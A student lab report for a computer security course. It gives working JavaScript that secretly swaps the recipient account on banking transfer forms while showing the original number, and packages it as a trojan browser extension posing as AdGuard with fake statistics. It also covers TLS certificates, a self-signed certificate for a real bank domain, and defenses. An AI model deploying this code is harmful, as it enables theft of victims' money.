# Banking Form Security and TLS Certificates
## Analysis of Banking Form Attacks and TLS Certificate Generation

**Course: Introduction to Computer Security**  

---

## Table of Contents
1. [Introduction](#introduction)
2. [Task 2.1: Banking Form Attack](#task-21-banking-form-attack)
   - [Problem Description](#problem-description)
   - [Attack Mechanism](#attack-mechanism)
   - [JavaScript Implementation](#javascript-implementation)
   - [Attack Code Analysis](#attack-code-analysis)
   - [Demonstration](#demonstration)
3. [Task 2.2: Browser Extension](#task-22-browser-extension)
   - [Extension Structure](#extension-structure)
   - [Extension Manifest](#extension-manifest)
   - [Content Script](#content-script)
   - [Background Script](#background-script)
   - [User Interface (Popup)](#user-interface-popup)
   - [Camouflage Techniques](#camouflage-techniques)
4. [Task 3.1: TLS Certificate for a Domain](#task-31-tls-certificate-for-a-domain)
   - [Domain Acquisition](#domain-acquisition)
   - [Server Configuration](#server-configuration)
   - [Let's Encrypt Certificate Generation](#lets-encrypt-certificate-generation)
   - [Nginx Configuration](#nginx-configuration)
   - [Testing and Verification](#testing-and-verification)
5. [Task 3.2: Attempting to Generate a Certificate for an Existing Bank](#task-32-attempting-to-generate-a-certificate-for-an-existing-bank)
   - [Limitations and Safeguards](#limitations-and-safeguards)
   - [Self-signed Certificate](#self-signed-certificate)
   - [Browser Response to Self-signed Certificates](#browser-response-to-self-signed-certificates)
6. [Effective Attack Scenarios](#effective-attack-scenarios)
7. [Defense Methods](#defense-methods)
   - [User-side Safeguards](#user-side-safeguards)
   - [Bank-side Safeguards](#bank-side-safeguards)
8. [Final Conclusions](#final-conclusions)
9. [Resources and Tools](#resources-and-tools)

---

## Introduction

As part of the "Introduction to Computer Security" course exercises, I conducted an analysis and implementation of two related threats that can affect the security of online transactions:

1. Modifying the behavior of a banking form to replace the recipient's account number
2. Implementing this attack as a browser extension
3. Generating and analyzing TLS certificates

This project shows how, even with TLS and HTTPS communication security, websites can be vulnerable to manipulations at the user's browser level. This demonstration is purely educational and aims to raise awareness about attack methods and appropriate defense mechanisms.

---

## Task 2.1: Banking Form Attack

### Problem Description

For Task 2.1, I needed to create a mechanism that:
1. Modifies the recipient's account number sent to the server
2. Simultaneously shows the user the originally entered number
3. Works exclusively at the user interface (visual layer) level

Such attacks are particularly dangerous because the user is unaware that their transfer will be redirected to a different recipient than intended.

### Attack Mechanism

The attack uses a combination of several JavaScript techniques:

1. **Form interception** - a `submit` event listener that activates before data is sent
2. **Data modification** - replacement of the account number field value just before form submission
3. **Hiding the modification** - using the MutationObserver API to track changes in the DOM and replace the displayed number back with the original
4. **Hidden markers** - adding invisible elements to the DOM allowing for attack verification

This mechanism works both on pages with single-step validation and on pages with a two-step confirmation process, which are typical for electronic banking.

### JavaScript Implementation

To demonstrate the problem, I created a page simulating a banking form similar to the PKO BP interface. On this page, I implemented the complete transfer process:

1. Form for entering recipient data and amount
2. Confirmation screen showing a summary of the entered data
3. Success screen after approving the transfer

In addition to the standard form functionality, I implemented the following UI elements:
- Dynamic field validation (recipient name, account number, amount, title)
- Real-time formatting of account number and amount
- Transitions between steps
- Calling appropriate functions at the confirmation stage

### Attack Code Analysis

The most important part of the attack is the JavaScript code that replaces the recipient's account number. Below is an analysis of the key fragments of this code:

```javascript
// Submit event listener that runs just before the form is sent
document.addEventListener('submit', function(e) {
  // Finding account number fields
  const accountFields = e.target.querySelectorAll(
    'input[id*="account" i], ' +
    'input[id*="konto" i], ' +
    'input[name*="account" i], ' +
    'input[name*="konto" i]'
  );
  
  if (accountFields.length === 0) return; // No matching fields
  
  accountFields.forEach(field => {
    // Saving the original account number
    if (field.value && !originalAccountNumber) {
      originalAccountNumber = field.value;
    }
    
    if (field.value) {
      // Saving the original number as a data attribute
      field.setAttribute('data-original-account', field.value);
      
      // Replacing with attacker's account number
      field.value = attackerAccountNumber;
    }
  });
});
```

The second key element is the mechanism for hiding the modification from the user:

```javascript
// MutationObserver monitors changes in the DOM
const observer = new MutationObserver(function(mutations) {
  // We search the DOM for displayed attacker's account number
  document.querySelectorAll('*').forEach(element => {
    if (element.textContent && 
        element.textContent.includes(attackerAccountNumber) && 
        element.childNodes.length <= 3) {
      
      // If found, replace back with the original number
      if (originalAccountNumber) {
        element.textContent = element.textContent.replace(
          attackerAccountNumber, 
          originalAccountNumber
        );
      }
    }
  });
});

// Starting the DOM observer
observer.observe(document.body, {
  childList: true,
  subtree: true,
  characterData: true
});
```

This code creates an observer that monitors all changes in the DOM tree. As soon as the attacker's account number appears in any element (e.g., on the confirmation screen), it is immediately replaced with the original number entered by the user.

### Demonstration

To demonstrate the attack:

1. On the demo page, we fill out the transfer form with any account number
2. After proceeding to the confirmation screen, the account number shown to the user remains the same as entered
3. However, the value actually sent to the server is already changed to the attacker's account number

The attack can be verified using the browser's developer tools:

```javascript
// Print both account numbers in the console
console.log("Number displayed:", document.getElementById("summary-account").textContent);
console.log("Number actually being sent:", document.getElementById("accountNumber").value);
```

Additional verification is done using a hidden marker added to the DOM that stores both account numbers:

```javascript
// Check the hidden marker
const marker = document.getElementById("attack-demonstration-marker");
console.log("Displayed:", marker.getAttribute("data-displayed-account"));
console.log("Sent:", marker.getAttribute("data-submitted-account"));
```

---

## Task 2.2: Browser Extension

### Extension Structure

For Task 2.2, I implemented the attack as a browser extension. This extension pretends to be the popular ad blocker "AdGuard" to increase the chances of installation by unsuspecting users. The extension structure includes:

- **manifest.json** - extension configuration file
- **content.js** - script injected into visited pages, containing the attack code
- **background.js** - background script managing the configuration
- **popup.html/js** - extension user interface
- **icons/** - folder with icons in various sizes

### Extension Manifest

The `manifest.json` file defines the extension properties, required permissions, and entry points:

```json
{
  "manifest_version": 3,
  "name": "AdGuard Free - Ad Blocker",
  "version": "1.2.3",
  "description": "Block ads, pop-ups and protect your privacy while browsing the internet",
  "permissions": ["activeTab", "storage", "scripting", "tabs"],
  "action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icons/icon16.png",
      "48": "icons/icon48.png",
      "128": "icons/icon128.png"
    }
  },
  "content_scripts": [
    {
      "matches": ["*://*/*"],
      "js": ["content.js"]
    }
  ],
  "background": {
    "service_worker": "background.js"
  }
}
```

Key manifest elements:
- `storage` permission - access to browser storage API
- `tabs` permission - access to open tabs
- `content_scripts` - definition of the script to be injected into all pages
- `service_worker` - background script running at all times

### Content Script

The `content.js` script is injected into every visited page. It contains the code that performs the attack on banking forms. Main functionalities:

1. **Banking form identification** - the script analyzes the page DOM looking for forms with account number fields
2. **Input data interception** - saves the original account number entered by the user
3. **Data replacement** - changes the account number to the attacker's number before form submission
4. **Hiding modifications** - restores the original number in the visual layer
5. **Ad blocking simulation** - for camouflage, provides fake blocking statistics

Here are the key elements of the content.js script:

```javascript
// Attack configuration
let attackerAccountNumber = "12345678901234567890123456";
let isActive = true; // Enabled by default
let originalAccountNumber = "";

// Get configuration from browser memory
chrome.storage.sync.get(['bankConfig'], function(result) {
  if (result.bankConfig) {
    attackerAccountNumber = result.bankConfig.targetAccountNumber || attackerAccountNumber;
    isActive = result.bankConfig.isActive !== undefined ? result.bankConfig.isActive : true;
  }
  
  if (isActive) {
    executeAttack();
  }
});

// Main attack function
function executeAttack() {
  // 1. Listen for data input
  document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT' && 
       (e.target.id.toLowerCase().includes('account') || 
        e.target.id.toLowerCase().includes('konto'))) {
      originalAccountNumber = e.target.value;
      
      // Save original number to memory
      chrome.storage.local.set({
        'originalAccount': originalAccountNumber
      });
    }
  });
  
  // 2. Replace number when submitting the form
  document.addEventListener('submit', function(e) {
    const accountFields = e.target.querySelectorAll(
      'input[id*="account" i], input[id*="konto" i]'
    );
    
    accountFields.forEach(field => {
      if (field.value) {
        field.setAttribute('data-original-account', field.value);
        field.value = attackerAccountNumber;
      }
    });
  });
  
  // 3. Restore original number in the interface
  const observer = new MutationObserver(function(mutations) {
    document.querySelectorAll('*').forEach(element => {
      if (element.textContent && 
          element.textContent.includes(attackerAccountNumber)) {
        
        if (originalAccountNumber) {
          element.textContent = element.textContent.replace(
            attackerAccountNumber, 
            originalAccountNumber
          );
        }
      }
    });
  });
  
  // Start DOM observer
  observer.observe(document.body, {
    childList: true,
    subtree: true,
    characterData: true
  });
}
```

### Background Script

The `background.js` script runs in the background at all times, regardless of the active tab. Its tasks include:

1. **Settings initialization** - setting default values upon installation
2. **Configuration management** - storing and updating the attacker's account number
3. **Ad blocker simulation** - updating "blocked ads" statistics
4. **Communication handling** - data exchange between the interface and content script

Example from `background.js`:

```javascript
// Configuration initialization upon installation
chrome.runtime.onInstalled.addListener(function() {
  // Default configuration
  chrome.storage.sync.set({
    bankConfig: {
      targetAccountNumber: "12345678901234567890123456", // Target account number
      isActive: true, // Active by default
      domains: [] // Optionally limit to specific domains
    }
  });
  
  // Ad blocker statistics initialization (camouflage)
  chrome.storage.local.set({
    adStats: {
      blockedAds: 1245, // Starting number for realism
      blockedTrackers: 87,
      lastReset: new Date().getTime()
    }
  });
});

// Statistics update when loading pages
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    // Ad blocking simulation
    chrome.storage.local.get(['adStats'], function(stats) {
      if (stats.adStats) {
        const newStats = {
          blockedAds: stats.adStats.blockedAds + Math.floor(Math.random() * 5 + 1),
          blockedTrackers: stats.adStats.blockedTrackers + Math.floor(Math.random() * 2),
          lastReset: stats.adStats.lastReset
        };
        
        chrome.storage.local.set({adStats: newStats});
      }
    });
  }
});
```

### User Interface (Popup)

The `popup.html` file and its accompanying `popup.js` create the extension's user interface, which opens when the icon is clicked. It is designed to resemble a real ad blocker:

1. **Function switches** - options to enable and disable "blocking"
2. **Statistics** - counters for blocked ads and trackers
3. **Hidden features** - the account number configuration field is hidden

The interface uses a style inspired by Windows 98 to build trust with users who might associate such a look with "old days" tools considered safe and proven.

```html
<!-- popup.html fragment -->
<div class="window">
  <div class="title-bar">
    <div class="title-bar-text">AdGuard - Ad Blocker</div>
    <div class="title-bar-controls">
      <button aria-label="Close" id="closeBtn"></button>
    </div>
  </div>

  <div class="window-body">
    <fieldset>
      <legend>Ad Blocking</legend>
      
      <div class="field-row">
        <input id="isActive" type="checkbox" checked>
        <label for="isActive">Protections active</label>
      </div>

      <div id="status" class="status-message success">Status: Active</div>
    </fieldset>
    
    <fieldset>
      <legend>Blocking Statistics</legend>
      
      <div class="stats-row">
        <span class="stats-label">Blocked Ads:</span>
        <span class="stats-value" id="adsBlocked">1,245</span>
      </div>
      
      <!-- Hidden field with account number to replace -->
      <input id="targetAccountInput" type="text" class="hidden-field" 
             value="12345678901234567890123456">
    </fieldset>
  </div>
</div>
```

### Camouflage Techniques

The extension uses several camouflage techniques to increase the chances of installation and avoid detection:

1. **Fake statistics** - increasing counters of blocked ads
2. **Credible name and description** - similarity to the real AdGuard
3. **Minimalist interface** - simple, familiar design with retro elements
4. **Hidden features** - the actual configuration options are invisible
5. **Seemingly legal permissions** - the required permissions are typical for ad blockers

---

## Task 3.1: TLS Certificate for a Domain

### Domain Acquisition

To obtain a legal TLS certificate, you need a domain that you control. For the task, I used the free DuckDNS service:

1. Creating an account on [DuckDNS](https://www.duckdns.org/)
2. Registering the subdomain "najlepszybankwpolsce.duckdns.org"
3. Configuring a DNS record pointing to the server's public IP address

Services like DuckDNS are often used by attackers because they allow obtaining a credible-looking domain for free and without identity verification.

### Server Configuration

For demonstration purposes, the server was configured on an Amazon EC2 instance:

1. **Instance launch** - Amazon Linux 2023
2. **Security group configuration** - opening ports 80 (HTTP) and 443 (HTTPS)
3. **Nginx installation** - using the `amazon_linux_2023_install.sh` script:

```bash
# System update
sudo dnf update -y

# Nginx installation
sudo dnf install nginx -y

# Certbot installation (for Let's Encrypt certificates)
sudo dnf install certbot python3-certbot-nginx -y

# Start Nginx
sudo systemctl start nginx

# Set Nginx to start automatically after reboots
sudo systemctl enable nginx
```

### Let's Encrypt Certificate Generation

For generating and managing the certificate, I used the Certbot tool, which works with Let's Encrypt and automates the domain verification process:

```bash
# Obtaining a certificate for the domain
sudo certbot --nginx -d najlepszybankwpolsce.duckdns.org

# Certificate verification
sudo certbot certificates
```

This process:
1. Verifies control over the domain (by placing a file on the HTTP server)
2. Generates a key pair (private and public)
3. Creates and signs the certificate
4. Automatically configures Nginx to use the certificate

### Nginx Configuration

The configured Nginx configuration file (`/etc/nginx/conf.d/demo-site.conf`) contains:

```nginx
server {
    listen 80;
    server_name najlepszybankwpolsce.duckdns.org;

    # Redirect HTTP to HTTPS
    location / {
        return 301 https://$host$request_uri;
    }
}

server {
    listen 443 ssl;
    server_name najlepszybankwpolsce.duckdns.org;
    
    ssl_certificate /etc/letsencrypt/live/najlepszybankwpolsce.duckdns.org/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/najlepszybankwpolsce.duckdns.org/privkey.pem;
    
    # SSL Configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    
    # HSTS directive handling
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Demo files directory
    root /var/www/demo-bank;
    index demo.html;
    
    location / {
        try_files $uri $uri/ =404;
    }
}
```

Key security configuration elements:
- Redirecting all HTTP traffic to HTTPS
- Using only secure protocols (TLSv1.2 and 1.3)
- Configuration of strong ciphers
- Enabling HSTS (HTTP Strict Transport Security) header

### Testing and Verification

After configuring the server, I conducted tests verifying:

1. **HTTPS availability** - checking if the page loads over HTTPS
2. **Certificate correctness** - verifying certificate details in the browser
3. **HTTP → HTTPS redirection** - checking automatic redirection
4. **Certificate expiration** - Let's Encrypt certificate is valid for 90 days
5. **Automatic renewal** - verifying the renewal script operation

The result is a fully functional demo site available over HTTPS with a valid TLS certificate.

---

## Task 3.2: Attempting to Generate a Certificate for an Existing Bank

### Limitations and Safeguards

For Task 3.2, I tried to generate a certificate for an existing bank's domain (www.pkobp.pl). This proved impossible for the following reasons:

1. **Domain ownership verification** - Let's Encrypt requires proving control over the domain through:
   - Placing a special file on the HTTP server (HTTP-01 method)
   - Creating a specific DNS record (DNS-01 method)

2. **Certificate Authority policies** - all public CAs (including Let's Encrypt) are obligated to:
   - Thoroughly verify domain ownership
   - Comply with CAB Forum standards
   - Audit the certificate issuance process

These safeguards make it impossible to legally obtain a certificate for a domain you don't control.

### Self-signed Certificate

As an alternative, you can create a self-signed certificate for any domain using the OpenSSL tool:

```bash
# Generate private key
openssl genrsa -out www.pkobp.pl.key 2048

# Generate certificate signing request (CSR)
openssl req -new -key www.pkobp.pl.key -out www.pkobp.pl.csr -subj "/C=PL/ST=Dolnoslaskie/L=Wroclaw/O=FakeBank/CN=www.pkobp.pl"

# Generate self-signed certificate
openssl x509 -req -days 365 -in www.pkobp.pl.csr -signkey www.pkobp.pl.key -out www.pkobp.pl.crt
```

However, such a certificate is not trusted by browsers and the operating system.

### Browser Response to Self-signed Certificates

Web browsers react to a self-signed certificate for a bank domain with very clear warnings:

1. **Full-screen warning** - page with a red background and clear danger message
2. **Crossed-out padlock icon** - in the address bar
3. **Automatic blocking** - some browsers completely block access
4. **Detailed problem description** - text informing about possible attack

Such behavior is a key safeguard against man-in-the-middle attacks and shows how important the PKI certificate system is for network security.

---

## Effective Attack Scenarios

The conducted analysis and demonstration point to several potential attack scenarios:

### 1. Malicious Browser Extensions

- **Distribution through unofficial channels** - forums, cracked software sites, fake ads
- **Taken over legitimate extensions** - purchasing popular extensions and updating with malicious code
- **Impersonation** - imitating known applications (as in our demonstration)

### 2. Content Modification Attacks

- **Public Wi-Fi networks** - especially unsecured ones
- **Infected devices** - already installed malware
- **Dishonest network administrators** - especially in companies and institutions

### 3. Social Engineering Attacks

- **Fake technical support** - "install this extension so I can help you"
- **Email chains** - "install this tool to secure your account"
- **Fake advertisements** - promoting "free" security tools

### 4. Attack Combinations

Particularly dangerous are attacks combining different techniques:
- Phishing + malicious extension
- Fake certificate + DOM manipulation
- Remote browser control + content substitution

---

## Defense Methods

### User-side Safeguards

1. **Installing extensions only from official sources**
   - Chrome Web Store
   - Mozilla Add-ons
   - Microsoft Edge Add-ons

2. **Regular verification of installed extensions**
   - Reviewing permissions
   - Removing unused extensions
   - Checking updates and changes in permissions

3. **Additional transaction verification**
   - Confirming transfer details through a mobile app
   - Using SMS notifications about account changes
   - Verifying account numbers on different devices

4. **Education and awareness**
   - Recognizing phishing signs
   - Caution when installing software
   - Responding to unusual browser behavior

### Bank-side Safeguards

1. **Multi-factor authentication**
   - SMS codes for each transaction
   - Mobile apps for confirming operations
   - Physical tokens

2. **Transaction context verification**
   - Confirming recipient data in the authorization code
   - Linking the authorization code with the account number
   - Transaction limits and anomaly detection

3. **Transaction pattern analysis**
   - Detecting unusual transactions
   - Blocking or verifying suspicious operations
   - Machine learning for pattern identification

4. **Content Security Policy**
   - Limiting the possibility of injecting malicious code
   - Protection against XSS
   - Monitoring page integrity

5. **Certificate Pinning**
   - Requiring specific certificates
   - Detecting certificate replacement attempts
   - Additional verification of the trust chain

---

## Final Conclusions

The experiments conducted show that:

1. **Security is multi-layered** - HTTPS communication alone does not provide complete protection if the endpoint (user's browser) is compromised.

2. **Trusting the interface is dangerous** - users should not completely rely on what they see on the screen, especially for financial transactions.

3. **TLS certificates are crucial but insufficient** - they provide encryption and domain verification, but do not protect against client-side attacks.

4. **Additional verification mechanisms are needed** - financial operations should be verified through independent channels (e.g., mobile apps, SMS).

5. **The PKI system works effectively** - attempting to obtain a certificate for someone else's domain is practically impossible, which protects against many types of attacks.

6. **User education is essential** - awareness of threats and proper security habits are key in defense against modern attacks.

It's worth noting that banks are aware of these threats and often implement advanced defense mechanisms, such as linking authorization codes with transaction details or multi-channel verification.

---

## Resources and Tools

In the project, I used the following tools:

1. **Creating the demo page**
   - HTML5, CSS3, JavaScript
   - SVG icons and graphics

2. **Browser extension development**
   - Chrome Extensions API
   - JavaScript ES6+
   - MutationObserver API
   - Chrome Storage API

3. **Server configuration**
   - Amazon EC2 (Amazon Linux 2023)
   - Nginx
   - Certbot / Let's Encrypt
   - Bash scripting

4. **Certificate generation**
   - OpenSSL
   - Let's Encrypt / ACME
   - DuckDNS

5. **Documentation and analysis**
   - Markdown
   - Chrome DevTools
   - Network monitoring

All source codes and configuration files have been attached to the project repository.

**WARNING:** This project was created solely for educational purposes. Using the described techniques for actual attacks is illegal and unethical.